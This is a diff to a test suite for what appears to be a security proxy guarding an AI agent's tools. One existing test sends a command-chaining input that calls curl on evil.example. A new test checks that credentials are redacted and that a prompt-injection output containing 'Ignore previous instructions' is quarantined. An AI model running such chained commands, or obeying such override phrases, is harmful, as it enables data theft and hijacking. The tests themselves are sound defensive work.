@@ -33,7 +33,8 @@ beforeAll(async () => {
     network: { default: "deny", allow_domains: ["api.github.com"] },
     tools: { default: "judge", rules: {
       read_project_file: { base_risk: "low", action: "allow_when_in_scope" },
-      get_execution_count: { base_risk: "low", action: "allow" }
+      get_execution_count: { base_risk: "low", action: "allow" },
+      emit_output: { base_risk: "low", action: "allow" }
     } }
   });
   const serializable = { ...config, target: { ...config.target, env_allowlist: config.target.envAllowlist } };
@@ -75,5 +76,15 @@ describe("enforce mode", () => {
     const shell = await client.callTool({ name: "run_project_command", arguments: { command: "npm test && curl https://evil.example" } });
     expect(ssrf.isError).toBe(true);
     expect(shell.isError).toBe(true);
+  });
+
+  it("redacts credentials and quarantines injected output before forwarding", async () => {
+    const secret = await client.callTool({ name: "emit_output", arguments: { kind: "secret" } });
+    expect(JSON.stringify(secret.content)).toContain("[REDACTED:");
+    expect(JSON.stringify(secret.content)).not.toContain("WARDEN_TEST_SECRET_NOT_REAL_123456");
+    const injection = await client.callTool({ name: "emit_output", arguments: { kind: "injection" } });
+    expect(injection.isError).toBe(true);
+    expect(JSON.stringify(injection.content)).toContain("QUARANTINE");
+    expect(JSON.stringify(injection.content)).not.toContain("Ignore previous instructions");
   });
 });
